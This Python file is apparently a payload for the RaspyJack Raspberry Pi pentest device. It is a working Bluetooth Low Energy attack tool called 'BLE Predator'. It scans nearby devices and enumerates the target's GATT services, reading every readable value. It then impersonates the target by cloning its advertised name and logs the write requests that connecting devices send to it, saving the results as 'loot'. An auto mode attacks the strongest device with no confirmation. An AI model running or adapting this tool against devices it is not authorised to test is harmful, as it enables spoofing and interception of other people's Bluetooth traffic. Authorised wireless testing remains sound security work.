#!/usr/bin/env python3
"""
RaspyJack Payload -- BLE Predator
==================================
Author: gabecamp

Multi-phase automated BLE offensive tool inspired by HaleHound's
BlePredator feature.  Cycles through four phases:

  IDLE  -> SCAN   : Discover nearby BLE devices
  SCAN  -> RECON  : Connect & enumerate GATT on chosen target
  RECON -> HONEYPOT : Impersonate target device, log incoming writes
  HONEYPOT -> IDLE : Stop and review captured data

Controls
--------
  OK         -- Advance phase / select target
  UP / DOWN  -- Scroll device list / log
  LEFT/RIGHT -- Switch dashboard (devices / recon / honeypot / log)
  KEY1       -- Auto-cycle all phases on best target
  KEY2       -- Export captured data to loot
  KEY3       -- Exit / abort current phase

Loot: /root/Raspyjack/loot/BLEPredator/
"""

import os
import sys
import time
import json
import asyncio
import threading
import subprocess
import re
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_bt_interface

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

HCI_DEV = None
LOOT_DIR = "/root/Raspyjack/loot/BLEPredator"
ROW_H = 12
ROWS_VISIBLE = 7
VIEWS = ["devices", "recon", "honeypot", "log"]

PHASE_IDLE = "IDLE"
PHASE_SCAN = "SCAN"
PHASE_RECON = "RECON"
PHASE_HONEYPOT = "HONEYPOT"

KNOWN_SERVICES = {
    "00001800": "Generic Access",
    "00001801": "Generic Attribute",
    "0000180a": "Device Information",
    "0000180f": "Battery Service",
    "0000180d": "Heart Rate",
    "00001812": "HID",
    "0000110b": "A2DP Audio Sink",
    "0000ffe0": "Serial/UART",
    "6e400001": "Nordic UART",
}

# ── state ──
phase = PHASE_IDLE
devices = []
selected_idx = 0
target = None
recon_data = {}
honeypot_active = False
write_events = []
event_log = []
scroll_off = 0
view_idx = 0
auto_mode = False
lock = threading.Lock()
stop_event = threading.Event()


def log_event(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    with lock:
        event_log.append(f"[{ts}] {msg}")
        if len(event_log) > 200:
            event_log.pop(0)


# ── BLE scanning (bleak) ──
def _scan_thread():
    global devices
    from bleak import BleakScanner

    log_event("Scanning BLE...")

    async def _scan():
        found = await BleakScanner.discover(timeout=8.0, adapter=HCI_DEV or "hci0")
        results = []
        for d in found:
            results.append({
                "addr": d.address,
                "name": d.name or "???",
                "rssi": d.rssi if hasattr(d, "rssi") else (
                    d.details.get("props", {}).get("RSSI", -99)
                    if hasattr(d, "details") and isinstance(d.details, dict) else -99
                ),
                "svcs": list(d.metadata.get("uuids", [])) if hasattr(d, "metadata") else [],
            })
        results.sort(key=lambda x: x["rssi"], reverse=True)
        return results

    try:
        res = asyncio.run(_scan())
        with lock:
            devices = res
        log_event(f"Found {len(res)} devices")
    except Exception as exc:
        log_event(f"Scan err: {exc}")


# ── GATT recon (bleak) ──
def _recon_thread(addr):
    global recon_data
    from bleak import BleakClient

    log_event(f"GATT recon: {addr}")

    async def _enum():
        data = {"services": [], "characteristics": []}
        async with BleakClient(addr, adapter=HCI_DEV or "hci0", timeout=12.0) as client:
            for svc in client.services:
                short = svc.uuid.replace("-0000-1000-8000-00805f9b34fb", "").lstrip("0") or svc.uuid[:8]
                svc_name = KNOWN_SERVICES.get(svc.uuid[:8], short)
                data["services"].append({"uuid": svc.uuid, "name": svc_name})
                for char in svc.characteristics:
                    props = char.properties
                    val = None
                    if "read" in props:
                        try:
                            raw = await client.read_gatt_char(char.uuid)
                            val = raw.hex() if len(raw) > 0 else ""
                        except Exception:
                            val = "<err>"
                    data["characteristics"].append({
                        "uuid": char.uuid,
                        "props": list(props),
                        "svc": svc_name,
                        "value": val,
                    })
        return data

    try:
        res = asyncio.run(_enum())
        with lock:
            recon_data.clear()
            recon_data.update(res)
        log_event(f"Recon done: {len(res['services'])} svcs, {len(res['characteristics'])} chars")
    except Exception as exc:
        log_event(f"Recon err: {exc}")


# ── Honeypot phase (hcitool + btmon) ──
_hp_procs = []


def _start_honeypot(dev_name, dev_class="0x000000"):
    global honeypot_active
    hci = HCI_DEV or "hci0"

    subprocess.run(["hciconfig", hci, "up"], capture_output=True)
    subprocess.run(["hciconfig", hci, "piscan"], capture_output=True)
    subprocess.run(["hciconfig", hci, "class", dev_class], capture_output=True)

    try:
        subprocess.run(
            ["bt-adapter", "--set", "Alias", dev_name],
            capture_output=True, timeout=3,
        )
    except FileNotFoundError:
        subprocess.run(
            ["bluetoothctl", "system-alias", dev_name],
            capture_output=True, timeout=3,
        )
    except Exception:
        pass

    le_params = [
        "hcitool", "-i", hci, "cmd",
        "0x08", "0x0008",
        "1e",
        "02", "01", "06",
        str(min(len(dev_name), 20) + 1).zfill(2),
        "09",
    ]
    for ch in dev_name[:20]:
        le_params.append(format(ord(ch), "02x"))
    while len(le_params) < 36 + 6:
        le_params.append("00")
    try:
        subprocess.run(le_params, capture_output=True, timeout=3)
    except Exception:
        pass

    subprocess.run(
        ["hcitool", "-i", hci, "cmd", "0x08", "0x000a", "01"],
        capture_output=True, timeout=3,
    )

    btmon = subprocess.Popen(
        ["btmon", "-i", hci],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    _hp_procs.append(btmon)
    honeypot_active = True
    log_event(f"Honeypot UP as '{dev_name}'")

    def _monitor():
        for line in btmon.stdout:
            if stop_event.is_set():
                break
            stripped = line.strip()
            if "Write Request" in stripped or "Write Command" in stripped:
                ts = datetime.now().strftime("%H:%M:%S")
                with lock:
                    write_events.append({
                        "time": ts,
                        "raw": stripped[:80],
                    })
                log_event(f"WRITE: {stripped[:50]}")
            elif "Connect Complete" in stripped or "LE Connection" in stripped:
                log_event(f"CONN: {stripped[:50]}")

    t = threading.Thread(target=_monitor, daemon=True)
    t.start()


def _stop_honeypot():
    global honeypot_active
    for p in _hp_procs:
        try:
            p.terminate()
        except Exception:
            pass
    _hp_procs.clear()
    hci = HCI_DEV or "hci0"
    subprocess.run(
        ["hcitool", "-i", hci, "cmd", "0x08", "0x000a", "00"],
        capture_output=True,
    )
    subprocess.run(["hciconfig", hci, "noscan"], capture_output=True)
    honeypot_active = False
    log_event("Honeypot stopped")


# ── export ──
def export_loot():
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    data = {
        "timestamp": ts,
        "target": target,
        "recon": recon_data,
        "write_events": write_events,
        "log": event_log[-50:],
    }
    path = os.path.join(LOOT_DIR, f"predator_{ts}.json")
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)
    log_event(f"Exported -> {os.path.basename(path)}")


# ── display ──
PHASE_COLORS = {
    PHASE_IDLE: "#888888",
    PHASE_SCAN: "#00aaff",
    PHASE_RECON: "#ffaa00",
    PHASE_HONEYPOT: "#ff3333",
}


def draw():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    view = VIEWS[view_idx]

    phase_col = PHASE_COLORS.get(phase, "#888888")
    d.rectangle([0, 0, WIDTH, 13], fill=phase_col)
    d.text((2, 1), f"{phase} | {view.upper()}", font=font, fill="black")

    y = 15
    if view == "devices":
        _draw_devices(d, y)
    elif view == "recon":
        _draw_recon(d, y)
    elif view == "honeypot":
        _draw_honeypot(d, y)
    elif view == "log":
        _draw_log(d, y)

    bar_y = HEIGHT - 10
    auto_str = " AUTO" if auto_mode else ""
    d.text((2, bar_y), f"D:{len(devices)} W:{len(write_events)}{auto_str}", font=font, fill="#666666")

    LCD.LCD_ShowImage(img, 0, 0)


def _draw_devices(d, y):
    with lock:
        devs = list(devices)
    if not devs:
        d.text((2, y), "No devices yet", font=font, fill="#555555")
        return
    for i in range(scroll_off, min(scroll_off + ROWS_VISIBLE, len(devs))):
        dev = devs[i]
        col = "#ffffff"
        if i == selected_idx:
            d.rectangle([0, y, WIDTH, y + ROW_H], fill="#333333")
            col = "#00ff00"
        name = dev["name"][:10]
        d.text((2, y), f"{name} {dev['rssi']}dB", font=font, fill=col)
        y += ROW_H


def _draw_recon(d, y):
    if not recon_data:
        d.text((2, y), "No recon data", font=font, fill="#555555")
        return
    svcs = recon_data.get("services", [])
    chars = recon_data.get("characteristics", [])
    d.text((2, y), f"Svcs:{len(svcs)} Chars:{len(chars)}", font=font, fill="#ffaa00")
    y += ROW_H
    items = []
    for s in svcs:
        items.append(f"[S] {s['name']}")
    for c in chars[:20]:
        p = ",".join(c["props"])[:8]
        items.append(f"  {c['uuid'][:8]} {p}")
    for i in range(scroll_off, min(scroll_off + ROWS_VISIBLE - 1, len(items))):
        d.text((2, y), items[i][:22], font=font, fill="#cccccc")
        y += ROW_H


def _draw_honeypot(d, y):
    if not honeypot_active:
        d.text((2, y), "Honeypot inactive", font=font, fill="#555555")
        return
    d.text((2, y), f"Impersonating: {(target or {}).get('name', '?')[:14]}", font=font, fill="#ff3333")
    y += ROW_H
    d.text((2, y), f"Writes captured: {len(write_events)}", font=font, fill="#ffaa00")
    y += ROW_H + 4
    with lock:
        evts = list(write_events)
    start = max(0, len(evts) - (ROWS_VISIBLE - 2))
    for evt in evts[start:]:
        d.text((2, y), f"{evt['time']} {evt['raw'][:16]}", font=font, fill="#cccccc")
        y += ROW_H


def _draw_log(d, y):
    with lock:
        lines = list(event_log)
    if not lines:
        d.text((2, y), "No events", font=font, fill="#555555")
        return
    start = max(0, len(lines) - ROWS_VISIBLE)
    for line in lines[start:]:
        d.text((2, y), line[:22], font=font, fill="#aaaaaa")
        y += ROW_H


# ── phase transitions ──
def advance_phase():
    global phase, target, scroll_off

    if phase == PHASE_IDLE:
        phase = PHASE_SCAN
        scroll_off = 0
        threading.Thread(target=_scan_thread, daemon=True).start()

    elif phase == PHASE_SCAN:
        with lock:
            if devices and selected_idx < len(devices):
                target = devices[selected_idx]
        if target:
            phase = PHASE_RECON
            scroll_off = 0
            threading.Thread(
                target=_recon_thread, args=(target["addr"],), daemon=True,
            ).start()
        else:
            log_event("Select a target first")

    elif phase == PHASE_RECON:
        if target:
            phase = PHASE_HONEYPOT
            scroll_off = 0
            dev_name = target.get("name", "BLE Device")[:20]
            _start_honeypot(dev_name)
        else:
            log_event("No target for honeypot")

    elif phase == PHASE_HONEYPOT:
        _stop_honeypot()
        phase = PHASE_IDLE
        log_event("Cycle complete")


def auto_cycle():
    global auto_mode, selected_idx
    auto_mode = True
    log_event("Auto-cycle started")

    phase_map = {PHASE_IDLE: 0, PHASE_SCAN: 8, PHASE_RECON: 0, PHASE_HONEYPOT: 30}

    advance_phase()
    time.sleep(1)

    while auto_mode and not stop_event.is_set():
        wait = phase_map.get(phase, 2)
        if phase == PHASE_SCAN:
            time.sleep(wait)
            with lock:
                if devices:
                    selected_idx = 0
            advance_phase()
        elif phase == PHASE_RECON:
            for _ in range(120):
                if stop_event.is_set() or not auto_mode:
                    return
                with lock:
                    done = bool(recon_data.get("services"))
                if done:
                    break
                time.sleep(0.5)
            advance_phase()
        elif phase == PHASE_HONEYPOT:
            time.sleep(wait)
            advance_phase()
            auto_mode = False
            log_event("Auto-cycle complete")
            return
        else:
            advance_phase()
        time.sleep(0.5)


# ── main ──
def main():
    global HCI_DEV, scroll_off, selected_idx, view_idx, auto_mode, phase

    HCI_DEV = select_bt_interface()
    log_event("BLE Predator ready")

    try:
        while True:
            draw()
            btn = get_button(PINS, GPIO)
            if btn is None:
                time.sleep(0.05)
                continue

            if btn == "KEY3":
                if phase == PHASE_HONEYPOT:
                    _stop_honeypot()
                    phase = PHASE_IDLE
                    auto_mode = False
                else:
                    break

            elif btn == "OK":
                if not auto_mode:
                    advance_phase()

            elif btn == "UP":
                if selected_idx > 0:
                    selected_idx -= 1
                if selected_idx < scroll_off:
                    scroll_off = selected_idx

            elif btn == "DOWN":
                mx = max(0, len(devices) - 1)
                if selected_idx < mx:
                    selected_idx += 1
                if selected_idx >= scroll_off + ROWS_VISIBLE:
                    scroll_off = selected_idx - ROWS_VISIBLE + 1

            elif btn == "LEFT":
                view_idx = (view_idx - 1) % len(VIEWS)
                scroll_off = 0

            elif btn == "RIGHT":
                view_idx = (view_idx + 1) % len(VIEWS)
                scroll_off = 0

            elif btn == "KEY1":
                if phase == PHASE_IDLE and not auto_mode:
                    threading.Thread(target=auto_cycle, daemon=True).start()
                elif auto_mode:
                    auto_mode = False
                    log_event("Auto-cycle cancelled")

            elif btn == "KEY2":
                export_loot()

    finally:
        stop_event.set()
        if honeypot_active:
            _stop_honeypot()
        GPIO.cleanup()


if __name__ == "__main__":
    main()
